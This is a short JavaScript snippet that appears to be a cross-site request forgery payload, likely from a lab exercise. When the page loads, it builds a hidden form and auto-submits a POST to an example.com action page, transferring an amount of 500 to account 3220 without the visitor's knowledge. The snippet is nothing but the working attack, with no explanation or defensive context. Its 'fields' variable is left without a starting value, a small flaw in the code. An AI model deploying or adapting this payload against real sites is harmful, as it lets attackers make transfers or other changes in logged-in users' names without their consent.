<script type="text/javascript">
function forge_post()
{
   var fields;
   fields += "<input type='hidden' name='to' value='3220'>";
   fields += "<input type='hidden' name='amount' value='500'>";

   var p = document.createElement("form");                    
   p.action = "http://www.example.com/action_post.php";
   p.innerHTML = fields;
   p.method = "post";
   document.body.appendChild(p);                             
   p.submit();                                              
}

window.onload = function() { forge_post();}                
</script>

